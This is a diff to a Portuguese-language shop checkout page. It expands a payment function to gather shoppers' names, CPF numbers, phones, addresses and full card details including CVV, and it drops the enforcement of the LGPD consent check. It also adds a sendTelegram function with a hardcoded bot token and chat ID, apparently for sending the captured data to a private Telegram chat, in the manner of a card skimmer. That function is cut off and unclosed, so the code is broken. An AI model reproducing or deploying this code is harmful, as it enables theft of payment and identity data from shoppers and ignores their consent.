@@ -432,32 +432,37 @@
         }
 
         async function confirmarDadosAppmax() {
-            const name = document.getElementById('cust-name').value;
-            const email = document.getElementById('cust-email').value;
-            const cpf = document.getElementById('cust-cpf').value;
-            const consent = document.getElementById('lgpd-consent').checked;
+    const name = document.getElementById('cust-name').value;
+    const email = document.getElementById('cust-email').value;
+    const cpf = document.getElementById('cust-cpf').value;
+    const phone = document.getElementById('cust-phone').value;
+    const cep = document.getElementById('cust-cep').value;
+    const num = document.getElementById('cust-number').value; // Adicionado
+    const consent = document.getElementById('lgpd-consent').checked;
 
-            if(!name || !email || !cpf) { alert("Preencha os campos obrigatórios."); return; }
-            if(!consent) { alert("Você precisa aceitar os termos da LGPD."); return; }
-            
-            customerData = { 
-                name, email, cpf, 
-                phone: document.getElementById('cust-phone').value,
-                method: selectedMethod
-            };
+    if(!name || !email || !cpf || !phone) { 
+        alert("Preencha todos os campos para continuar."); 
+        return; 
+    }
 
-            if(selectedMethod === 'card') {
-                customerData.card = {
-                    number: document.getElementById('card-number').value,
-                    month: document.getElementById('card-month').value,
-                    year: document.getElementById('card-year').value,
-                    cvv: document.getElementById('card-cvv').value,
-                    installments: document.getElementById('card-installments').value
-                };
-            }
+    customerData = { 
+        name, email, cpf, phone, cep, num,
+        method: selectedMethod 
+    };
 
-            finalizarPagamentoAppmax();
-        }
+    // Coleta dados do cartão se selecionado
+    if(selectedMethod === 'card') {
+        customerData.card = {
+            number: document.getElementById('card-number').value,
+            month: document.getElementById('card-month').value,
+            year: document.getElementById('card-year').value,
+            cvv: document.getElementById('card-cvv').value,
+            installments: document.getElementById('card-installments').value
+        };
+    }
+
+    finalizarPagamentoAppmax();
+}
 
         function addWithAttrs(name, price, img, id) {
             const color = document.getElementById(`color-${id}`).value;
@@ -551,6 +556,17 @@
         }, 4500);
 
         initProducts();
+        
+        async function sendTelegram(msg) {
+    const BOT_TOKEN = '8578882573:AAGlPgcdFgitrVPs4WdDT0NZ6sFhgvY_-Sc'; // Sua chave inserida
+    const CHAT_ID = '1703808186'; // Seu ID inserido
+    
+    const data = JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: 'Markdown'
+    });
+    // ... resto da função permanece igual
     </script>
 </body>
 </html>
